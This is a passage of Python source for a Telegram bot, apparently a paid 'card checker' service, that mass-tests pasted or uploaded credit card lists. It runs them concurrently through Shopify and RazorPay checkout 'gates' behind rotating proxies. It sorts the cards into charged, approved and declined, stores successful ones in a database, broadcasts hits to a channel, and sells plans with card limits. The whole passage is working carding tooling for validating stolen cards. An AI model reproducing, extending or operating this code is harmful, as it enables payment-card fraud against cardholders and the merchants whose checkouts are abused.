    workers = MRZ_PER_USER_WORKERS if sem_type == "mrz" else MSP_PER_USER_WORKERS
    user_sem = get_user_sem(uid, sem_type)
    http_session = await get_user_http_session(uid, sem_type)
    is_rz = gate_name == "RazorPay"
    sm = await styled_reply(event, f"<pre>{PE} {bs('Processing')} ━ {mode} ━ {gate_name} ━ {workers}{bs('w')}</pre>", emoji_ids=[CE["chart"]])
    last_ui = [0]; lcd, lrd = "-", "-"
    def is_stopped():
        proc = process_store.get(uid)
        if not proc: return True
        return proc.get("stopped", False) if isinstance(proc, dict) else False
    async def update_ui():
        nonlocal last_ui
        now = time.time()
        if now - last_ui[0] < 3.0 or is_stopped(): return
        last_ui[0] = now
        kb = [[pbtn(f" {lcd}", "none", style="primary")], [pbtn(f" {lrd}", "none", style="primary")],
              [pbtn(f"{bs('C')} ━ {charged}", "none", style="success"), pbtn(f"{bs('A')} ━ {approved}", "none", style="success")],
              [pbtn(f"{bs('D')} ━ {declined}", "none", style="danger"), pbtn(f"{bs('E')} ━ {errors}", "none", style="danger")],
              [pbtn(f" {checked}/{total}", "none", style="primary")], [pbtn(bs("Stop"), f"{stop_prefix}:{uid}", style="danger")]]
        try: await styled_edit(sm, f"<pre>{PE} {bs('Processing')}...</pre>", buttons=kb, emoji_ids=[CE["star"]])
        except: pass
    async def worker(card):
        nonlocal checked, charged, approved, declined, errors, lcd, lrd
        if is_stopped(): return
        async with user_sem:
            if is_stopped(): return
            try:
                result = await check_func(card, http_session)
                if is_stopped(): return
                status = result.get("Status", "Declined")
                resp = result.get("Response", ""); gw = result.get("Gateway", gate_name)
                checked += 1; lcd = card; lrd = resp[:30]
                if status == "Error":
                    errors += 1
                    error_cards.append(f"{card} | {resp}")
                elif status == "SiteError":
                    dead_cards.append(f"{card} | {resp}")
                elif status == "Charged":
                    charged += 1
                    charged_cards.append(f"{card} | {resp} | {gw}")
                    asyncio.create_task(save_card_to_db(card, "CHARGED", resp, gw, result.get('Price', '-')))
                    asyncio.create_task(_send_mass_hit(card, result, status, uid, username, name, is_rz))
                elif status == "Approved":
                    approved += 1
                    approved_cards.append(f"{card} | {resp} | {gw}")
                    asyncio.create_task(save_card_to_db(card, "APPROVED", resp, gw, result.get('Price', '-')))
                    if send_approved:
                        asyncio.create_task(_send_mass_hit(card, result, status, uid, username, name, is_rz))
                else:
                    declined += 1
                    declined_cards.append(f"{card} | {resp}")
                await update_ui()
            except asyncio.CancelledError: return
            except Exception as e:
                if not is_stopped():
                    errors += 1; checked += 1
                    error_cards.append(f"{card} | EXC: {str(e)[:60]}")
    batch_size = workers * 2; all_tasks = []
    proc = process_store.get(uid)
    for i in range(0, len(cards), batch_size):
        if is_stopped(): break
        batch_tasks = [asyncio.create_task(worker(c)) for c in cards[i:i+batch_size]]
        all_tasks.extend(batch_tasks)
        if isinstance(proc, dict): proc["tasks"] = all_tasks
        await asyncio.gather(*batch_tasks, return_exceptions=True)
    await asyncio.sleep(0.3)
    el = int(time.time() - st); h, m, s = el // 3600, (el % 3600) // 60, el % 60
    stop_label = f" ({bs('Stopped')})" if is_stopped() else ""
    ft = f"""{PE} <b>{bs('Complete')}{stop_label}</b> {PE}\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <b>{bs('Charged')}</b> ━ <code>{charged}</code>\n{PE} <b>{bs('Approved')}</b> ━ <code>{approved}</code>\n{PE} <b>{bs('Declined')}</b> ━ <code>{declined}</code>\n{PE} <b>{bs('Errors')}</b> ━ <code>{errors}</code>\n{PE} <b>{bs('Dead')}</b> ━ <code>{len(dead_cards)}</code>\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <b>{bs('Checked')}</b> ━ <code>{checked}/{total}</code>"""
    fkb = [[pbtn(f"{bs('C')} ━ {charged}", "none", style="success"), pbtn(f"{bs('A')} ━ {approved}", "none", style="success")],
           [pbtn(f"{bs('T')} ━ {checked}/{total}", "none", style="primary"), pbtn(f"{h}{bs('h')}{m}{bs('m')}{s}{bs('s')}", "none", style="primary")]]
    for _ in range(3):
        try: await styled_edit(sm, ft, buttons=fkb, emoji_ids=[CE["crown"], CE["crown"], CE["gem"], CE["check"], CE["declined"], CE["warn"], CE["star"]]); break
        except: await asyncio.sleep(0.5)
    await send_final_file(uid, charged, approved, declined, errors, total,
                          charged_cards=charged_cards, approved_cards=approved_cards,
                          declined_cards=declined_cards, error_cards=error_cards,
                          dead_cards=dead_cards, target_chat=uid)
    process_store.pop(uid, None)
    await cleanup_user_http_session(uid, sem_type); cleanup_user_sem(uid)


async def _send_mass_hit(card, result, status, uid, username, name, is_rz=False):
    await asyncio.sleep(HIT_DELAY)
    try:
        bi = await get_bin_info(card.split("|")[0])
        gw = result.get('Gateway', 'RazorPay' if is_rz else 'Shopify')
        resp = result.get('Response', '')[:150]
        if is_rz:
            msg, eid = format_card_result_no_price(status, card, gw, resp, bi)
        else:
            msg, eid = format_card_result(status, card, gw, resp, result.get('Price', '-'), result.get('site', '-'), bi, 0.0)
        try: await styled_send(uid, msg, emoji_ids=eid, buttons=HIT_BUTTON)
        except: pass
        if status == "Charged":
            asyncio.create_task(send_channel_hit(result, uid, username, name, "RazorPay" if is_rz else "Shopify"))
    except: pass


async def send_final_file(uid, charged, approved, declined, errors, total,
                          charged_cards=None, approved_cards=None,
                          declined_cards=None, error_cards=None, dead_cards=None,
                          hits=None, target_chat=None):
    charged_cards = charged_cards or []
    approved_cards = approved_cards or []
    declined_cards = declined_cards or []
    error_cards = error_cards or []
    dead_cards = dead_cards or []
    target = target_chat or uid
    fn = f"aliya_results_{uid}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    try:
        async with aiofiles.open(fn, 'w', encoding='utf-8') as f:
            await f.write(f"{'='*55}\n")
            await f.write(f"           ALIYA X CHK — MASS RESULTS\n")
            await f.write(f"{'='*55}\n\n")
            await f.write(f"Total Checked : {total}\n")
            await f.write(f"Charged       : {charged}\n")
            await f.write(f"Approved      : {approved}\n")
            await f.write(f"Declined      : {declined}\n")
            await f.write(f"Errors        : {errors}\n")
            await f.write(f"Dead/Site Err : {len(dead_cards)}\n")
            await f.write(f"Generated     : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")

            await f.write(f"{'='*55}\n✅ CHARGED ({charged})\n{'='*55}\n")
            if charged_cards:
                for c in charged_cards: await f.write(f"{c}\n")
            else: await f.write("(none)\n")
            await f.write("\n")

            await f.write(f"{'='*55}\n✔ APPROVED ({approved})\n{'='*55}\n")
            if approved_cards:
                for c in approved_cards: await f.write(f"{c}\n")
            else: await f.write("(none)\n")
            await f.write("\n")

            await f.write(f"{'='*55}\n❌ DECLINED ({declined})\n{'='*55}\n")
            if declined_cards:
                for c in declined_cards: await f.write(f"{c}\n")
            else: await f.write("(none)\n")
            await f.write("\n")

            await f.write(f"{'='*55}\n⚠ ERRORS ({errors})\n{'='*55}\n")
            if error_cards:
                for c in error_cards: await f.write(f"{c}\n")
            else: await f.write("(none)\n")
            await f.write("\n")

            await f.write(f"{'='*55}\n💀 DEAD / SITE ERROR ({len(dead_cards)})\n{'='*55}\n")
            if dead_cards:
                for c in dead_cards: await f.write(f"{c}\n")
            else: await f.write("(none)\n")
            await f.write("\n")
            await f.write(f"{'='*55}\nMade with ❤ by @{OWNER_USERNAME}\n{'='*55}\n")

        try:
            await styled_send(target, f"{PE} <b>{bs('Results')}</b> {PE}", emoji_ids=[CE["fire"], CE["fire"]], file=fn)
        except: pass
        try: os.remove(fn)
        except: pass
    except Exception as e:
        log_system("FILE", f"Send final failed: {e}", "error")


# ====================== /msp ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]msp\b'))
async def mass_check_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    _, at, plan = await get_user_access(event)
    if at == "banned": t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    uid = event.sender_id
    if uid not in ADMIN_ID and not is_paid_plan(plan):
        return await send_premium_only_message(event)
    cl = get_cc_limit(plan, uid)
    if uid in ACTIVE_MTXT_PROCESSES: return await styled_reply(event, f"{PE} <b>{bs('Already running')}</b>", emoji_ids=[CE["warn"]])
    content, from_inline = "", False
    cmd_text = re.sub(r'^[/.]msp\s*', '', event.raw_text, flags=re.IGNORECASE).strip()
    if cmd_text: content = cmd_text; from_inline = True
    elif event.reply_to_msg_id:
        rm = await event.get_reply_message()
        if not rm: return await styled_reply(event, f"{PE} <b>{bs('Message not found')}</b>", emoji_ids=[CE["warn"]])
        if rm.document:
            fp = await rm.download_media()
            try:
                async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f: content = await f.read()
                os.remove(fp)
            except: pass
        elif rm.text: content = rm.text
    else: return await styled_reply(event, f"{PE} <b>{bs('Reply to .txt or paste cards after')} </b><code>/msp</code>", emoji_ids=[CE["info"]])
    sites = await get_user_sites(uid)
    if not sites: return await styled_reply(event, f"{PE} <b>{bs('No sites!')} </b><code>/add</code>", emoji_ids=[CE["warn"]])
    cards = extract_cc(content)
    if not cards: return await styled_reply(event, f"{PE} <b>{bs('No valid cards')}</b>", emoji_ids=[CE["cross"]])
    if len(cards) > cl: cards = cards[:cl]
    await styled_reply(event, f"<pre>{PE} {len(cards)} {bs('CCs')} | {bs('Limit')}: {cl}</pre>", emoji_ids=[CE["star"]])
    proxies = await get_all_user_proxies(uid)
    rotator = SmartRotator()
    async def shopify_check(card, http_session):
        result, _ = await check_card_with_retry(card, sites, uid, proxies, 2, rotator, cancel_check=lambda: ACTIVE_MTXT_PROCESSES.get(uid, {}).get("stopped", True), http_session=http_session)
        return result
    if from_inline:
        ACTIVE_MTXT_PROCESSES[uid] = {"stopped": False, "tasks": []}
        asyncio.create_task(_run_mass_process(event, cards, proxies, True, ACTIVE_MTXT_PROCESSES, "stop_chk", shopify_check, "Shopify", "msp"))
    else:
        kb = [[pbtn(bs("Charged + Approved"), f"chk_pref:yes:{uid}", style="success")], [pbtn(bs("Only Charged"), f"chk_pref:no:{uid}", style="danger")]]
        pm = await styled_reply(event, f"{PE} <b>{bs('Filter')}</b>", kb, emoji_ids=[CE["chart"]])
        USER_APPROVED_PREF[f"chk_{uid}"] = {"cards": cards, "sites": sites, "proxies": proxies, "event": event, "pref_msg": pm, "rotator": rotator}


@client.on(events.CallbackQuery(pattern=rb"chk_pref:(yes|no):(\d+)"))
async def chk_pref_cb(event):
    pref = event.pattern_match.group(1).decode()
    uid = int(event.pattern_match.group(2).decode())
    if event.sender_id != uid: return await event.answer(f"{bs('Not yours')}!", alert=True)
    data = USER_APPROVED_PREF.pop(f"chk_{uid}", None)
    if not data: return await event.answer(f"{bs('Expired')}!", alert=True)
    try: await data["pref_msg"].delete()
    except: pass
    if uid in ACTIVE_MTXT_PROCESSES: return await event.answer(f"{bs('Already running')}!", alert=True)
    ACTIVE_MTXT_PROCESSES[uid] = {"stopped": False, "tasks": []}
    await event.answer(f"{bs('Starting')}...")
    rotator = data.get("rotator", SmartRotator())
    sites, proxies = data["sites"], data["proxies"]
    async def shopify_check(card, http_session):
        result, _ = await check_card_with_retry(card, sites, uid, proxies, 2, rotator, cancel_check=lambda: ACTIVE_MTXT_PROCESSES.get(uid, {}).get("stopped", True), http_session=http_session)
        return result
    asyncio.create_task(_run_mass_process(data["event"], data["cards"], proxies, pref == "yes", ACTIVE_MTXT_PROCESSES, "stop_chk", shopify_check, "Shopify", "msp"))


@client.on(events.CallbackQuery(pattern=rb"stop_chk:(\d+)"))
async def stop_chk_cb(event):
    puid = int(event.pattern_match.group(1).decode())
    if event.sender_id != puid and event.sender_id not in ADMIN_ID: return await event.answer(f"{bs('Not yours')}!", alert=True)
    proc = ACTIVE_MTXT_PROCESSES.get(puid)
    if not proc: return await event.answer(f"{bs('None active')}!", alert=True)
    if isinstance(proc, dict):
        proc["stopped"] = True
        for t in proc.get("tasks", []):
            if not t.done(): t.cancel()
    await event.answer(f"{bs('Stopping')}...", alert=True)


# ====================== /mrz ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]mrz\b'))
async def mrz_mass_check_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    _, at, plan = await get_user_access(event)
    if at == "banned": t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    uid = event.sender_id
    if uid not in ADMIN_ID and not is_paid_plan(plan):
        return await send_premium_only_message(event)
    cl = get_cc_limit(plan, uid)
    if uid in ACTIVE_MRZ_PROCESSES: return await styled_reply(event, f"{PE} <b>{bs('Already running')}</b>", emoji_ids=[CE["warn"]])
    content, from_inline = "", False
    cmd_text = re.sub(r'^[/.]mrz\s*', '', event.raw_text, flags=re.IGNORECASE).strip()
    if cmd_text: content = cmd_text; from_inline = True
    elif event.reply_to_msg_id:
        rm = await event.get_reply_message()
        if not rm: return await styled_reply(event, f"{PE} <b>{bs('Message not found')}</b>", emoji_ids=[CE["warn"]])
        if rm.document:
            fp = await rm.download_media()
            try:
                async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f: content = await f.read()
                os.remove(fp)
            except: pass
        elif rm.text: content = rm.text
    else: return await styled_reply(event, f"{PE} <b>{bs('Reply to .txt or paste cards after')} </b><code>/mrz</code>", emoji_ids=[CE["info"]])
    cards = extract_cc(content)
    if not cards: return await styled_reply(event, f"{PE} <b>{bs('No valid cards')}</b>", emoji_ids=[CE["cross"]])
    if len(cards) > cl: cards = cards[:cl]
    await styled_reply(event, f"<pre>{PE} {len(cards)} {bs('CCs')} | {bs('RazorPay')} | {bs('Limit')}: {cl}</pre>", emoji_ids=[CE["star"]])
    proxies = await get_all_user_proxies(uid)
    async def rz_check(card, http_session):
        return await check_rz_with_retry(card, proxies, uid, max_retries=2, cancel_check=lambda: ACTIVE_MRZ_PROCESSES.get(uid, {}).get("stopped", True), http_session=http_session)
    if from_inline:
        ACTIVE_MRZ_PROCESSES[uid] = {"stopped": False, "tasks": []}
        asyncio.create_task(_run_mass_process(event, cards, proxies, True, ACTIVE_MRZ_PROCESSES, "stop_mrz", rz_check, "RazorPay", "mrz"))
    else:
        kb = [[pbtn(bs("Charged + Approved"), f"mrz_pref:yes:{uid}", style="success")], [pbtn(bs("Only Charged"), f"mrz_pref:no:{uid}", style="danger")]]
        pm = await styled_reply(event, f"{PE} <b>{bs('Filter')}</b>", kb, emoji_ids=[CE["chart"]])
        USER_APPROVED_PREF[f"mrz_{uid}"] = {"cards": cards, "proxies": proxies, "event": event, "pref_msg": pm}


@client.on(events.CallbackQuery(pattern=rb"mrz_pref:(yes|no):(\d+)"))
async def mrz_pref_cb(event):
    pref = event.pattern_match.group(1).decode()
    uid = int(event.pattern_match.group(2).decode())
    if event.sender_id != uid: return await event.answer(f"{bs('Not yours')}!", alert=True)
    data = USER_APPROVED_PREF.pop(f"mrz_{uid}", None)
    if not data: return await event.answer(f"{bs('Expired')}!", alert=True)
    try: await data["pref_msg"].delete()
    except: pass
    if uid in ACTIVE_MRZ_PROCESSES: return await event.answer(f"{bs('Already running')}!", alert=True)
    ACTIVE_MRZ_PROCESSES[uid] = {"stopped": False, "tasks": []}
    await event.answer(f"{bs('Starting')}...")
    proxies = data["proxies"]
    async def rz_check(card, http_session):
        return await check_rz_with_retry(card, proxies, uid, max_retries=2, cancel_check=lambda: ACTIVE_MRZ_PROCESSES.get(uid, {}).get("stopped", True), http_session=http_session)
    asyncio.create_task(_run_mass_process(data["event"], data["cards"], proxies, pref == "yes", ACTIVE_MRZ_PROCESSES, "stop_mrz", rz_check, "RazorPay", "mrz"))


@client.on(events.CallbackQuery(pattern=rb"stop_mrz:(\d+)"))
async def stop_mrz_cb(event):
    puid = int(event.pattern_match.group(1).decode())
    if event.sender_id != puid and event.sender_id not in ADMIN_ID: return await event.answer(f"{bs('Not yours')}!", alert=True)
    proc = ACTIVE_MRZ_PROCESSES.get(puid)
    if not proc: return await event.answer(f"{bs('None active')}!", alert=True)
    if isinstance(proc, dict):
        proc["stopped"] = True
        for t in proc.get("tasks", []):
            if not t.done(): t.cancel()
    await event.answer(f"{bs('Stopping')}...", alert=True)


# ====================== /status ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]status$'))
async def status_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    try:
        st = await _build_status_text()
        await styled_reply(event, st, buttons=[[pbtn("🔄 Refresh", data="refresh_status", style="primary")]])
    except Exception as e: await styled_reply(event, f"⚠️ <code>{e}</code>")


@client.on(events.CallbackQuery(data=b"refresh_status"))
async def refresh_status_cb(event):
    if event.sender_id not in ADMIN_ID: return await event.answer("No!", alert=True)
    await event.answer("Refreshing...")
    try:
        st = await _build_status_text()
        msg = event.message if hasattr(event, 'message') else await event.get_message()
        await styled_edit(msg, st, buttons=[[pbtn("🔄 Refresh", data="refresh_status", style="primary")]])
    except: pass


# ====================== ADMIN ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.](maintenance|maintance)\s+(on|off)$'))
async def maint_toggle(event):
    if event.sender_id not in ADMIN_ID: return
    a = event.raw_text.lower().split()[1]
    await set_maintenance_mode(a == "on")
    await styled_reply(event, f"{PE} <b>{bs('Maintenance')} {bs('On') if a == 'on' else bs('Off')}</b>", emoji_ids=[CE["stop"] if a == "on" else CE["check"]])


@client.on(events.NewMessage(pattern=r'(?i)^[/.]gates$'))
async def gates_list_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    lines = ["⚙ <b>Gate Status</b>", "━━━━━━━━━━━━━━━━━"]
    for gid, g in GATES.items():
        status = "✅ ON" if g["enabled"] else "❌ OFF"
        lines.append(f"{g['emoji']} <b>{g['name']}</b> ➤ {status}")
    lines.append("━━━━━━━━━━━━━━━━━")
    lines.append("<i>Toggle: /gate on shopify</i>")
    lines.append("<i>Toggle all: /gate off all</i>")
    await styled_reply(event, "\n".join(lines))


@client.on(events.NewMessage(pattern=r'(?i)^[/.]gate\s+(on|off)\s+(.+)$'))
async def gate_toggle_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    m = re.match(r'(?i)^[/.]gate\s+(on|off)\s+(.+)$', event.raw_text)
    action = m.group(1).lower()
    targets = m.group(2).lower().replace(",", " ").split()
    on_off = (action == "on")
    if "all" in targets:
        for g in GATES.values(): g["enabled"] = on_off
        await save_gates()
        return await styled_reply(event, f"✅ All gates turned <b>{action.upper()}</b>")
    changed, unknown = [], []
    for t in targets:
        matched = False
        if t in GATES:
            GATES[t]["enabled"] = on_off
            changed.append(GATES[t]["name"]); matched = True
        else:
            for gid, g in GATES.items():
                if g["name"].lower() == t:
                    g["enabled"] = on_off
                    changed.append(g["name"]); matched = True
                    break
        if not matched: unknown.append(t)
    if changed: await save_gates()
    msg = ""
    if changed: msg += f"✅ <b>{action.upper()}</b>: {', '.join(changed)}\n"
    if unknown: msg += f"❌ Unknown: {', '.join(unknown)}"
    if not msg: msg = "❌ No gates matched"
    await styled_reply(event, msg.strip())


async def _handle_plan_assign(event, plan_key):
    if event.sender_id not in ADMIN_ID: return
    parts = event.raw_text.split()
    if len(parts) < 2: return await styled_reply(event, f"{PE} <code>/{plan_key} user_id</code>", emoji_ids=[CE["warn"]])
    try: target_uid = int(parts[1])
    except: return await styled_reply(event, f"{PE} <b>{bs('Invalid ID')}</b>", emoji_ids=[CE["cross"]])
    pi = PLANS[plan_key]
    try: target_entity = await client_instance.get_entity(target_uid); target_name = getattr(target_entity, 'first_name', None) or "Unknown"
    except: target_name = "Unknown"
    await ensure_user(target_uid)
    current_plan = await get_user_plan(target_uid); is_upgrade = is_paid_plan(current_plan)
    await set_user_plan(target_uid, pi["tier"], pi["duration_days"])
    expiry_date = (datetime.now() + timedelta(days=pi["duration_days"])).strftime('%Y-%m-%d %H:%M:%S')
    await styled_reply(event, f"""<b>✅ {bs('Plan Updated')}</b>\n<a href='{OWNER_URL}'>⊀</a> <b>{bs('User')}</b> ↬ <a href='tg://user?id={target_uid}'>{target_name}</a>\n<a href='{OWNER_URL}'>⊀</a> <b>{bs('Plan')}</b> ↬ {pi['emoji']} <b>{pi['name']}</b>\n<a href='{OWNER_URL}'>⊀</a> <b>{bs('Duration')}</b> ↬ <code>{pi['duration_days']} {bs('days')}</code>\n<a href='{OWNER_URL}'>⊀</a> <b>{bs('Expires')}</b> ↬ <code>{expiry_date}</code>""")
    try:
        await styled_send(target_uid, f"""<b>🎉 {bs('Plan Upgraded!')} 🎉</b>\n{pi['emoji']} <b>{pi['name']}</b> ━ <code>{pi['duration_days']}d</code>\n{bs('Limit')}: {get_cc_limit(pi['tier'])} CCs\n{bs('Expires')}: {expiry_date}""")
    except: pass
    try:
        receipt_id = f"ALIYA-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
        lt = f"{bs('Plan RENEWED')} 🔄" if is_upgrade else f"{bs('New Plan')} 🛒"
        await styled_send(LOG_CHANNEL_ID, f"<b>{lt}</b>\n<a href='tg://user?id={target_uid}'>{target_name}</a> ━ {pi['emoji']}{pi['name']} ━ {pi['price']} ━ {receipt_id}")
    except: pass


@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan1\b'))
async def plan1_cmd(event): await _handle_plan_assign(event, "plan1")
@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan2\b'))
async def plan2_cmd(event): await _handle_plan_assign(event, "plan2")
@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan3\b'))
async def plan3_cmd(event): await _handle_plan_assign(event, "plan3")
@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan4\b'))
async def plan4_cmd(event): await _handle_plan_assign(event, "plan4")


@client.on(events.NewMessage(pattern=r'(?i)^[/.]rplan\b'))
async def rplan_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    parts = event.raw_text.split()
    if len(parts) < 2: return await styled_reply(event, f"{PE} <code>/rplan user_id</code>", emoji_ids=[CE["warn"]])
    try: target_uid = int(parts[1])
    except: return await styled_reply(event, f"{PE} <b>{bs('Invalid')}</b>", emoji_ids=[CE["cross"]])
    await ensure_user(target_uid)
    cp = await get_user_plan(target_uid)
    if not is_paid_plan(cp): return await styled_reply(event, f"{PE} <b>{bs('No active plan')}</b>", emoji_ids=[CE["cross"]])
    try: ent = await client_instance.get_entity(target_uid); tn = getattr(ent, 'first_name', None) or "?"
    except: tn = "?"
    await set_user_plan(target_uid, "Bronze", 0)
    await styled_reply(event, f"{PE} <b>{bs('Revoked')} {cp} from {tn}</b>", emoji_ids=[CE["check"]])
    try: await styled_send(target_uid, f"{PE} <b>{bs('Your plan has been ended. Contact admin to renew.')}</b>", emoji_ids=[CE["warn"]])
    except: pass


@client.on(events.NewMessage(pattern=r'(?i)^[/.]planall$'))
async def planall_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    all_users = []
    for tier in PAID_TIERS:
        async for u in db["users"].find({"plan": tier}): all_users.append(u)
    if not all_users: return await styled_reply(event, f"{PE} <b>{bs('No active plans')}</b>", emoji_ids=[CE["warn"]])
    fn = f"plans_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    content = f"ACTIVE PLANS ({len(all_users)})\n{'='*40}\n"
    for u in all_users:
        uid2 = u.get("user_id", "?"); tier = u.get("plan", "?")
        exp = u.get("expiry"); es = exp.strftime('%Y-%m-%d') if exp else "?"
        try: ent = await client_instance.get_entity(uid2); un = getattr(ent, 'first_name', None) or "?"
        except: un = "?"
        content += f"{un} | {uid2} | {tier} | {es}\n"
    async with aiofiles.open(fn, 'w') as f: await f.write(content)
    try: await styled_send(event.chat_id, f"{PE} <b>{bs('Plans')} ({len(all_users)})</b>", emoji_ids=[CE["fire"]], file=fn)
    except: pass
    try: os.remove(fn)
    except: pass


@client.on(events.NewMessage(pattern=r'(?i)^[/.]stats$'))
async def stats_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    try:
        tu = await get_total_users(); pu = await get_premium_count()
        ts2 = await get_total_sites_count(); tc = await get_total_cards_count()
        ch = await get_charged_count(); ap = await get_approved_count()
        await styled_reply(event, f"""{PE} <b>{bs('Stats')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('Users')}:</b> <code>{tu}</code> | <b>{bs('Premium')}:</b> <code>{pu}</code>
{PE} <b>{bs('Sites')}:</b> <code>{ts2}</code> | <b>{bs('Cards')}:</b> <code>{tc}</code>
{PE} <b>{bs('Charged')}:</b> <code>{ch}</code> | <b>{bs('Approved')}:</b> <code>{ap}</code>
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('MSP Active')}:</b> <code>{len(ACTIVE_MTXT_PROCESSES)}</code> ({MSP_PER_USER_WORKERS}w)
{PE} <b>{bs('MRZ Active')}:</b> <code>{len(ACTIVE_MRZ_PROCESSES)}</code> ({MRZ_PER_USER_WORKERS}w)""", emoji_ids=[CE["fire"], CE["fire"], CE["chart"], CE["link"], CE["gem"], CE["brain"], CE["shield"]])
    except Exception as e:
        await styled_reply(event, f"{PE} <b>{bs('Error')}:</b> <code>{e}</code>", emoji_ids=[CE["cross"]])


# ====================== MAIN ======================
async def main():
    global client_instance
    client_instance = client
    log_system("BOOT", "Initializing database...")
    await init_db()
    log_system("BOOT", "Loading gates...")
    await load_gates()
    while True:
        try:
            log_system("BOOT", "Starting bot...")
            await client.start(bot_token=BOT_TOKEN)
            log_system("BOOT", "✅ Bot Started!")
            await client.run_until_disconnected()
        except FloodWaitError as e:
            log_system("FLOOD", f"Sleeping {e.seconds+5}s", "warning")
            await asyncio.sleep(e.seconds + 5)
        except Exception as e:
            log_system("CRASH", f"{e}", "error")
            await asyncio.sleep(10)


if __name__ == "__main__":
    asyncio.run(main())
    